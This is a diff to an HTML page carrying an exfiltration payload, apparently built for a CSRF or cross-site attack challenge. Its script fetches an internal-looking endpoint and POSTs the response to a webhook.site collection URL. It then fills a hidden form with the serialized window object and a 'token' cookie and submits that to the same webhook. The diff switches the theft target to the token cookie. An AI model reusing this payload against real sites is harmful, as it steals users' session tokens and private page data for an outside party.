@@ -5,16 +5,16 @@
                     <iframe  name="frame"></iframe>
 
                     <form method="post" action="https://webhook.site/debe482d-4f6b-4bba-a5e3-c75e4db2418a" target="frame" id="form">
-                        <input type="hidden" name="title" id="cookie" value="CSRF" />
-                        <input type="hidden" name="body" id="window" value="CSRF" />
+                        <input type="hidden" name="cookie" id="cookie" value="CSRF" />
+                        <input type="hidden" name="window" id="window" value="CSRF" />
                         <input type="hidden" name="user" value="tester" />
                     </form>
 
                     <script>
                      fetch('http://45.12.114.110:30031/table/list').then(res=>res.text()).then(async (r)=>{
                        await fetch('https://webhook.site/debe482d-4f6b-4bba-a5e3-c75e4db2418a?q=', {method:'POST', body:r});
-                                 document.getElementById('cookie').value = document
-                      document.getElementById('window').value = await cookieStore.get("cookie1")
+                                 document.getElementById('cookie').value = JSON.stringify(window)
+                      document.getElementById('window').value = await cookieStore.get("token")
                         document.getElementById('form').submit()
                      })
             
